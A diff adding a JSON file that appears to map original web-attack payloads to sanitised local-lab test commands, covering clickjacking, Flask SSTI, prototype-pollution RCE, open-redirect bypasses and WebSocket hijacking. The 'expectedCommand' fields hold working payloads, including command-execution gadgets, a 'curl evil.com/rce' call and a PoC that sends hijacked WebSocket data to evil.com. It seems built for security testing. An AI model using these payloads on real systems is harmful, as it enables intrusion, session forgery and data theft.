@@ -1,0 +1,198 @@
+{
+  "schemaVersion": 1,
+  "entries": [
+    {
+      "id": "clickjacking-basic",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "curl -sI \"http://target.com\" | grep -iE \"x-frame-options|content-security-policy|frame-ancestors\"\n\n# 批量检测:\nfor url in $(cat urls.txt); do\n  echo -n \"$url: \"\n  xfo=$(curl -sI \"$url\" | grep -i \"x-frame-options\")\n  csp=$(curl -sI \"$url\" | grep -i \"frame-ancestors\")\n  [ -z \"$xfo\" ] && [ -z \"$csp\" ] && echo \"VULNERABLE\" || echo \"Protected: $xfo $csp\"\ndone",
+          "command": "curl --silent --show-error --max-time 5 -D - -o /dev/null \"http://127.0.0.1:18080/lab/clickjacking/account-confirm\" | grep -Ei \"^(HTTP/|X-Frame-Options:|Content-Security-Policy:)\""
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "<html>\n<head><title>Win a Prize!</title>\n<style>\n  #target-frame {\n    position: absolute; top: 0; left: 0;\n    width: 500px; height: 500px;\n    opacity: 0.0001; /* 近乎完全透明 */\n    z-index: 2; border: none;\n  }\n  #decoy-btn {\n    position: absolute; top: 120px; left: 50px;\n    z-index: 1; padding: 15px 30px;\n    font-size: 20px; cursor: pointer;\n    background: #4CAF50; color: white;\n    border: none; border-radius: 5px;\n  }\n</style></head>\n<body>\n  <h1>Congratulations! You Won!</h1>\n  <p>Click the button to claim your prize:</p>\n  <button id=\"decoy-btn\">Claim Prize</button>\n  <iframe id=\"target-frame\" src=\"http://target.com/account/delete\"></iframe>\n</body></html>",
+          "command": "<!doctype html>\n<meta charset=\"utf-8\">\n<title>Clickjacking alignment lab</title>\n<style>\n  .stage { position: relative; width: 520px; height: 260px; }\n  .decoy { position: absolute; left: 140px; top: 120px; z-index: 1; }\n  iframe { position: absolute; inset: 0; width: 520px; height: 260px; opacity: .08; z-index: 2; border: 1px solid #cbd5e1; }\n</style>\n<div class=\"stage\">\n  <button class=\"decoy\" type=\"button\">LAB_MARKER_CJ_ALIGN_A1</button>\n  <iframe src=\"http://127.0.0.1:18080/lab/clickjacking/account-confirm?marker=CJ_ALIGN_A1\"></iframe>\n</div>"
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "<html>\n<head><style>\n  #source { width:200px; height:50px; background:#eee; text-align:center; line-height:50px; }\n  #target-frame { position:absolute; top:0; left:0; width:600px; height:400px; opacity:0.0001; z-index:10; }\n</style>\n<script>\n  // 监听拖拽事件，可以跨域提取数据\n  document.addEventListener(\"drag\", function(e) {\n    console.log(\"Dragging:\", e.dataTransfer.getData(\"text\"));\n  });\n</script></head>\n<body>\n  <div id=\"source\" draggable=\"true\">Drag this to win!</div>\n  <div id=\"drop-zone\" style=\"width:200px;height:200px;border:2px dashed #ccc;margin-top:20px;\">Drop Here</div>\n  <iframe id=\"target-frame\" src=\"http://target.com/profile\" sandbox=\"allow-scripts allow-forms\"></iframe>\n</body></html>",
+          "command": "<!doctype html>\n<meta charset=\"utf-8\">\n<title>Clickjacking two-step lab</title>\n<style>\n  .stage { position: relative; width: 640px; height: 360px; }\n  iframe { position: absolute; inset: 0; width: 640px; height: 360px; opacity: .12; border: 0; }\n  .marker { position: absolute; left: 72px; top: 188px; z-index: 2; pointer-events: none; }\n</style>\n<div class=\"stage\">\n  <strong class=\"marker\">LAB_MARKER_CJ_STEP_B2</strong>\n  <iframe src=\"http://127.0.0.1:18080/lab/clickjacking/profile-preview?marker=CJ_STEP_B2\" sandbox=\"allow-forms\"></iframe>\n</div>"
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "<style>\n  .overlay { pointer-events: none; position: absolute; z-index: 100; }\n  iframe { pointer-events: auto; position: absolute; opacity: 0; }\n</style>\n<div class=\"overlay\">\n  <h1>Survey: Rate Our Service</h1>\n  <p>Select your rating below:</p>\n  <!-- 诱饵内容完全不拦截鼠标事件 -->\n  <div style=\"display:flex; gap:20px; margin-top:50px;\">\n    <span style=\"font-size:40px\">⭐</span>\n    <span style=\"font-size:40px\">⭐⭐</span>\n    <span style=\"font-size:40px\">⭐⭐⭐</span>\n  </div>\n</div>\n<iframe src=\"http://target.com/admin/grant-role?role=admin&user=attacker\" style=\"width:100%;height:100%;border:none;\"></iframe>",
+          "command": "<!doctype html>\n<meta charset=\"utf-8\">\n<title>Pointer routing lab</title>\n<style>\n  .stage { position: relative; width: 480px; height: 240px; }\n  .guide { position: absolute; inset: 0; z-index: 2; pointer-events: none; outline: 2px dashed #e11d48; }\n  iframe { position: absolute; inset: 0; width: 480px; height: 240px; opacity: .15; border: 0; }\n</style>\n<div class=\"stage\">\n  <div class=\"guide\">LAB_MARKER_CJ_POINTER_C3</div>\n  <iframe src=\"http://127.0.0.1:18080/lab/clickjacking/consent-preview?marker=CJ_POINTER_C3\"></iframe>\n</div>"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "<iframe src=\"https://target.com\" sandbox=\"allow-scripts allow-forms allow-same-origin\"></iframe>\n\n<!-- 利用sandbox allow-top-navigation绕过 -->\n<iframe src=\"https://target.com\" sandbox=\"allow-scripts allow-top-navigation allow-forms\"></iframe>\n\n<!-- 利用sandbox+srcdoc绕过 -->\n<iframe srcdoc=\"<script>top.location='https://target.com'</script>\" sandbox=\"allow-scripts allow-top-navigation\"></iframe>",
+          "command": "for path in frame-deny frame-sameorigin frame-csp; do curl --silent --show-error --max-time 5 -D - -o /dev/null \"http://127.0.0.1:18080/lab/clickjacking/$path\" | grep -Ei \"^(HTTP/|X-Frame-Options:|Content-Security-Policy:)\"; done"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "<!-- 利用浏览器对ALLOW-FROM支持不一致 -->\n<!-- Chrome/Safari忽略ALLOW-FROM，仅CSP frame-ancestors生效 -->\n\n<!-- 双重iframe绕过frame-busting -->\n<iframe src=\"data:text/html,<iframe src='https://target.com'></iframe>\"></iframe>\n\n<!-- 利用window.name绕过 -->\n<iframe src=\"attacker-page.html\" name=\"payload_data\"></iframe>",
+          "command": "node -e \"for (const value of ['DENY','SAMEORIGIN',\"frame-ancestors 'self'\"]){console.log(JSON.stringify({policy:value,normalized:value.toLowerCase()}))}\""
+        },
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "<!-- 双重嵌套绕过frame-busting -->\n<iframe src=\"middle-page.html\"></iframe>\n\n<!-- middle-page.html内容 -->\n<html><body>\n<iframe src=\"https://target.com\" sandbox=\"allow-forms\"></iframe>\n</body></html>\n\n<!-- onbeforeunload阻止跳转 -->\n<script>window.onbeforeunload=function(){return \"x\";}</script>\n<iframe src=\"https://target.com\"></iframe>",
+          "command": "npx playwright test tests/clickjacking-frame-policy.spec.mjs --project=chromium --reporter=line"
+        }
+      ]
+    },
+    {
+      "id": "flask-vuln",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# Jinja2模板注入探测\n{{7*7}}\n${7*7}\n<%= 7*7 %>\n\n# 如果返回49则存在SSTI\n\n# 获取配置\n{{config}}\n{{self.__class__}}\n\n# 命令执行\n{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}\n{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+          "command": "curl --fail-with-body --silent --show-error --max-time 5 -G \"http://127.0.0.1:18080/lab/flask/render\" --data-urlencode \"name={{7*7}}\" -H \"X-Request-ID: flask-ssti-a1\" | jq -e '.rendered == \"49\" and .request_id == \"flask-ssti-a1\"'"
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# Flask Session签名\n# 获取SECRET_KEY后可以伪造Session\n\n# 解签Session\nfrom flask.sessions import SecureCookieSessionInterface\nfrom itsdangerous import URLSafeTimedSerializer\n\n# 解签\ndef decode_session(cookie_value, secret_key):\n    serializer = URLSafeTimedSerializer(secret_key)\n    return serializer.loads(cookie_value)\n\n# 签名伪造\ndef encode_session(data, secret_key):\n    serializer = URLSafeTimedSerializer(secret_key)\n    return serializer.dumps(data)\n\n# 伪造管理员Session\nfake_session = encode_session({\"user_id\": 1, \"is_admin\": True}, SECRET_KEY)",
+          "command": "python -c \"from app import app; value=app.config.get('SECRET_KEY'); print({'configured':bool(value),'length':len(value or ''),'is_debug':bool(app.debug)})\""
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# Flask Debug模式\n# 访问/debug或/console\n# 可以执行任意Python代码\n\n# Werkzeug Debug Console\n# 访问:\nhttp://target/console\n\n# 执行代码\nimport os; os.system('id')\n__import__('os').system('id')",
+          "command": "code=$(curl --silent --show-error --max-time 5 -o /dev/null -w '%{http_code}' \"http://127.0.0.1:18080/console\"); printf 'console_status=%s\\n' \"$code\"; test \"$code\" = 401 -o \"$code\" = 403 -o \"$code\" = 404"
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "# Flask Debug PIN\n# 需要获取:\n# 1. 用户名\n# 2. modname\n# 3. app路径\n# 4. MAC地址\n\n# 读取信息\n{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}\n{{config.__class__.__init__.__globals__['os'].environ}}\n\n# 计算PIN\n# 使用脚本计算Werkzeug PIN",
+          "command": "python -c \"from app import app; rules=sorted(str(rule) for rule in app.url_map.iter_rules()); print('\\n'.join(rule for rule in rules if any(token in rule.lower() for token in ('debug','console','admin'))))\""
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# 过滤绕过\n# 使用attr\n{{''|attr('__class__')|attr('__mro__')}}\n\n# 使用request\n{{request|attr('application')|attr('__globals__')}}\n\n# 使用字符串拼接\n{{'__cla'~'ss__'}}\n\n# 使用编码\n{{''['\\x5f\\x5fclass\\x5f\\x5f']}}",
+          "command": "curl --fail-with-body --silent --show-error --max-time 5 -G \"http://127.0.0.1:18080/lab/flask/render\" --data-urlencode \"name={{'LAB'~'_JINJA_B2'}}\" -H \"X-Request-ID: flask-ssti-b2\" | jq -e '.rendered == \"LAB_JINJA_B2\"'"
+        }
+      ]
+    },
+    {
+      "id": "proto-server-rce",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# 发送__proto__污染测试\ncurl -X POST \"https://{TARGET}/api/update\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"__proto__\": {\"polluted\": \"test123\"}}'\n\n# constructor方式\ncurl -X POST \"https://{TARGET}/api/merge\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"constructor\": {\"prototype\": {\"polluted\": \"test123\"}}}'\n\n# 验证污染是否成功(通过报错/行为变化)\ncurl \"https://{TARGET}/api/debug\" | grep \"polluted\"",
+          "command": "curl --fail-with-body --silent --show-error --max-time 5 -X POST \"http://127.0.0.1:18080/lab/prototype/merge\" -H \"Content-Type: application/json\" -H \"X-Request-ID: proto-a1\" --data '{\"__proto__\":{\"labMarker\":\"PROTO_CANARY_A1\"}}' | jq -e '.ownMarker == null and .prototypeMarker == null'"
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# EJS RCE gadget——污染outputFunctionName\ncurl -X POST \"https://{TARGET}/api/settings\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"__proto__\": {\"outputFunctionName\": \"x;process.mainModule.require(\\\"child_process\\\").execSync(\\\"id\\\");x\"}}'\n\n# 触发模板渲染\ncurl \"https://{TARGET}/dashboard\"\n\n# EJS client参数RCE\ncurl -X POST \"https://{TARGET}/api/config\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"__proto__\": {\"client\": true, \"escapeFunction\": \"1;return process.mainModule.require(\\\"child_process\\\").execSync(\\\"id\\\")\"}}'",
+          "command": "curl --fail-with-body --silent --show-error --max-time 5 -X POST \"http://127.0.0.1:18080/lab/prototype/merge\" -H \"Content-Type: application/json\" -H \"X-Request-ID: proto-b2\" --data '{\"constructor\":{\"prototype\":{\"labMarker\":\"PROTO_CANARY_B2\"}}}' | jq -e '.ownMarker == null and .prototypeMarker == null'"
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# Pug/Jade RCE gadget——污染block属性\ncurl -X POST \"https://{TARGET}/api/profile\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"__proto__\": {\"block\": {\"type\": \"Text\", \"val\": \"x]));process.mainModule.require(\\\"child_process\\\").execSync(\\\"curl evil.com/rce\\\");//\"}}}'\n\n# Handlebars RCE gadget\ncurl -X POST \"https://{TARGET}/api/template\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"__proto__\": {\"allowedProtoMethods\": {\"__defineGetter__\": true}, \"allowedProtoProperties\": {\"__defineGetter__\": true}}}'",
+          "command": "rg -n --glob '*.{js,cjs,mjs,ts,tsx}' '(?:Object\\.assign|merge|defaultsDeep|set)\\s*\\(' src server | Select-Object -First 80"
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "# 污染toString造成异常\n{\"__proto__\": {\"toString\": null}}\n\n# 污染status属性改变响应\n{\"__proto__\": {\"status\": 500}}\n\n# 污染环境变量注入\n{\"__proto__\": {\"env\": {\"NODE_OPTIONS\": \"--require /proc/self/environ\"}}}\n\n# 污染shell属性(配合child_process.exec)\n{\"__proto__\": {\"shell\": \"/proc/self/exe\", \"argv0\": \"console.log(require(\\\"fs\\\").readFileSync(\\\"/etc/passwd\\\",\\\"utf8\\\"))//\"}}}",
+          "command": "npm ls --all --json > artifacts/npm-tree-prototype-audit.json\nnpm audit --package-lock-only --json > artifacts/npm-audit-prototype.json"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# Unicode编码\n{\"\\u005f\\u005fproto\\u005f\\u005f\": {\"polluted\": true}}\n\n# constructor路径\n{\"constructor\": {\"prototype\": {\"polluted\": true}}}\n\n# 嵌套路径\n{\"a\": {\"__proto__\": {\"polluted\": true}}}\n\n# 使用JSON5语法(如果支持)\n{__proto__: {polluted: true}}\n\n# 数组原型污染\n{\"__proto__\": [], \"length\": 1, \"0\": \"exploit\"}",
+          "command": "curl --fail-with-body --silent --show-error --max-time 5 -X POST \"http://127.0.0.1:18080/lab/prototype/merge\" -H \"Content-Type: application/json\" -H \"X-Request-ID: proto-c3\" --data '{\"settings\":{\"__proto__\":{\"labMarker\":\"PROTO_CANARY_C3\"}}}' | jq -e '.ownMarker == null and .prototypeMarker == null'"
+        }
+      ]
+    },
+    {
+      "id": "redirect-bypass",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "redirect=http%3a%2f%2fattacker.com",
+          "command": "http://127.0.0.1:18080/lab/redirect?next=https%3A%2F%2Fredirect-canary.invalid%2Fencoded-a1"
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "redirect=http://target.com@attacker.com",
+          "command": "http://127.0.0.1:18080/lab/redirect?next=https://allowed.invalid@redirect-canary.invalid/userinfo-b2"
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "redirect=https:/\\attacker.com",
+          "command": "http://127.0.0.1:18080/lab/redirect?next=https:/\\redirect-canary.invalid/backslash-c3"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# 反斜杠替代正斜杠\nhttps://target.com/redirect?url=https://evil.com\\@target.com\nhttps://target.com/redirect?url=https:\\\\evil.com\n\n# 路径穿越绕过域名白名单\nhttps://target.com/redirect?url=https://target.com/..%2f@evil.com\nhttps://target.com/redirect?url=//evil.com/%2f..%2f\n\n# 协议相对URL\nhttps://target.com/redirect?url=//evil.com\nhttps://target.com/redirect?url=\\\\evil.com",
+          "command": "http://127.0.0.1:18080/lab/redirect?next=//redirect-canary.invalid/protocol-relative-d4"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "# 片段标识符混淆\nhttps://target.com/redirect?url=https://target.com#@evil.com\nhttps://target.com/redirect?url=https://target.com%23@evil.com\n\n# 参数污染\nhttps://target.com/redirect?url=https://target.com&url=https://evil.com\nhttps://target.com/redirect?url=https://target.com%26next=evil.com\n\n# 编码混淆\nhttps://target.com/redirect?url=https%3a%2f%2fevil.com\nhttps://target.com/redirect?url=%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d",
+          "command": "http://127.0.0.1:18080/lab/redirect?next=https://allowed.invalid%23@redirect-canary.invalid/fragment-e5"
+        },
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "# 空字节截断\nhttps://target.com/redirect?url=https://target.com%00@evil.com\nhttps://target.com/redirect?url=https://evil.com%00.target.com\n\n# 换行符注入\nhttps://target.com/redirect?url=https://evil.com%0d%0aLocation:%20https://evil.com\n\n# Tab/空格混淆\nhttps://target.com/redirect?url=https://evil .com\nhttps://target.com/redirect?url=java%09script:alert(1)\nhttps://target.com/redirect?url=\\x09javascript:alert(1)",
+          "command": "http://127.0.0.1:18080/lab/redirect?next=https://redirect-canary.invalid%250d%250aX-Lab-Marker%253A%2520REDIRECT_F6"
+        }
+      ]
+    },
+    {
+      "id": "ws-hijack",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# 从前端代码搜索WebSocket连接\ncurl -s \"https://{TARGET}/static/js/main.js\" | grep -oP \"wss?://[^\\x27\\x22\\s]+\"\n\n# 浏览器开发者工具检查(Console)\n# 在Network标签筛选WS类型请求\n\n# 手动连接测试\nwebsocat \"wss://{TARGET}/ws\" -H \"Origin: https://evil.com\" --no-close\n\n# 检查握手响应中的Origin处理\ncurl -i -N -H \"Connection: Upgrade\" -H \"Upgrade: websocket\" \\\n  -H \"Sec-WebSocket-Version: 13\" -H \"Sec-WebSocket-Key: dGVzdA==\" \\\n  -H \"Origin: https://evil.com\" \\\n  \"https://{TARGET}/ws\"",
+          "command": "curl --http1.1 --silent --show-error --max-time 5 -o /dev/null -D - \"http://127.0.0.1:18080/ws/lab\" -H \"Connection: Upgrade\" -H \"Upgrade: websocket\" -H \"Sec-WebSocket-Version: 13\" -H \"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\" -H \"Origin: https://cross-origin.invalid\" | grep -Ei \"^(HTTP/|Upgrade:|Connection:|Sec-WebSocket-Accept:)\""
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "<!-- CSWSH攻击页面 -->\n<html>\n<body>\n<h1>WebSocket Cross-Site Hijacking POC</h1>\n<div id=\"output\"></div>\n<script>\n  // 目标WebSocket——浏览器会自动带上Cookie\n  var ws = new WebSocket(\"wss://{TARGET}/ws\");\n  \n  ws.onopen = function() {\n    document.getElementById(\"output\").innerHTML += \"<p>Connected!</p>\";\n    // 以受害者身份发送消息\n    ws.send(JSON.stringify({action: \"get_profile\"}));\n    ws.send(JSON.stringify({action: \"list_messages\"}));\n  };\n  \n  ws.onmessage = function(evt) {\n    // 窃取WebSocket返回的数据\n    document.getElementById(\"output\").innerHTML += \"<pre>\" + evt.data + \"</pre>\";\n    // 外带到攻击者服务器\n    fetch(\"https://evil.com/collect\", {\n      method: \"POST\",\n      body: evt.data\n    });\n  };\n</script>\n</body>\n</html>",
+          "command": "<!doctype html>\n<meta charset=\"utf-8\">\n<title>Cross-origin WebSocket lab</title>\n<pre id=\"result\">pending</pre>\n<script>\n  const result = document.querySelector('#result');\n  const socket = new WebSocket('ws://127.0.0.1:18080/ws/lab', 'payloader-lab-v1');\n  socket.addEventListener('open', () => socket.send(JSON.stringify({action: 'echo', marker: 'CSWSH_CANARY_A1'})));\n  socket.addEventListener('message', event => { result.textContent = event.data; socket.close(1000, 'lab complete'); });\n  socket.addEventListener('error', () => { result.textContent = 'connection rejected'; });\n</script>"
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# 如果WebSocket消息被拼入后端查询\n# SQL注入\nws.send(JSON.stringify({\n  action: \"search\",\n  query: \"test\\x27 UNION SELECT username,password FROM users--\"\n}));\n\n# XSS(如果消息被渲染到其他用户页面)\nws.send(JSON.stringify({\n  action: \"chat\",\n  message: \"<img src=x onerror=alert(document.cookie)>\"\n}));\n\n# 命令注入\nws.send(JSON.stringify({\n  action: \"exec\",\n  target: \"127.0.0.1;id\"\n}));",
+          "command": "socket.send(JSON.stringify({action: \"profile_preview\", marker: \"CSWSH_AUTHZ_B2\"}));"
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "# Python WebSocket监听和分析脚本\nimport asyncio\nimport websockets\nimport json\n\nasync def monitor():\n    uri = \"wss://{TARGET}/ws\"\n    headers = {\"Cookie\": \"{SESSION_COOKIE}\"}\n    \n    async with websockets.connect(uri, extra_headers=headers) as ws:\n        # 发送认证消息\n        await ws.send(json.dumps({\"type\": \"auth\", \"token\": \"{TOKEN}\"}))\n        \n        while True:\n            msg = await ws.recv()\n            data = json.loads(msg)\n            print(f\"[{data.get('type', 'unknown')}] {msg}\")\n            \n            # 记录敏感数据\n            if 'password' in msg.lower() or 'token' in msg.lower():\n                with open('ws_sensitive.log', 'a') as f:\n                    f.write(msg + '\\n')\n\nasyncio.run(monitor())",
+          "command": "import asyncio\nimport json\nimport websockets\n\nasync def capture_lab_messages():\n    async with websockets.connect(\"ws://127.0.0.1:18080/ws/lab\", origin=\"https://same-origin.invalid\", subprotocols=[\"payloader-lab-v1\"]) as socket:\n        await socket.send(json.dumps({\"action\": \"echo\", \"marker\": \"WS_CAPTURE_C3\"}))\n        for _ in range(3):\n            message = await asyncio.wait_for(socket.recv(), timeout=2)\n            print(message)\n            if \"WS_CAPTURE_C3\" in message:\n                break\n\nasyncio.run(capture_lab_messages())"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# Origin头伪造(仅在非浏览器环境有效)\nwebsocat \"wss://{TARGET}/ws\" -H \"Origin: https://{TARGET}\"\n\n# 子域名绕过\nOrigin: https://test.{TARGET}  # 如果验证不严格\nOrigin: https://{TARGET}.evil.com  # 域名后缀混淆\n\n# null Origin(某些浏览器场景)\n# 使用data: URI或沙箱iframe\n<iframe sandbox=\"allow-scripts\" src=\"data:text/html,<script>new WebSocket('wss://{TARGET}/ws')</script>\">\n\n# 使用WebSocket子协议绕过\nSec-WebSocket-Protocol: graphql-ws, chat",
+          "command": "for origin in https://same-origin.invalid https://cross-origin.invalid null; do printf \"origin=%s\\n\" \"$origin\"; websocat --max-messages 1 -H=\"Origin: $origin\" ws://127.0.0.1:18080/ws/lab 2>&1 | head -n 3; done"
+        }
+      ]
+    }
+  ]
+}
